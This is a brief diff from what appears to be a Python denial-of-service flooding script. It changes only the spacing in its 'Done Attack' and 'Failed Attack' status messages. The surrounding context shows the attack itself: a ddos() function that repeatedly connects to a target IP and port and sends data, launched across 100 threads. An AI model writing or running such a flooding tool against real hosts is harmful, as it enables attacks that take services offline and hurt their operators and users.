@@ -37,7 +37,7 @@ def ddos():
 			s.connect((ip,port))
 			s.sendto(bytes,(ip,port))
 			s.close()
-			print(Fore.LIGHTGREEN_EX+f"[+] Done Attack: {ip}:{port}\t|Count : {c}");c+=1
-		except:print(Fore.LIGHTRED_EX+f"[-] Failed Attack: {ip}:{port}\t|Count : {c}");c+=1
+			print(Fore.LIGHTGREEN_EX+f"[+] Done Attack: {ip}:{port}  | Count : {c}");c+=1
+		except:print(Fore.LIGHTRED_EX+f"[-] Failed Attack: {ip}:{port}  | Count : {c}");c+=1
 for i in range(int(100)):
 	threading.Thread(target=ddos).start()
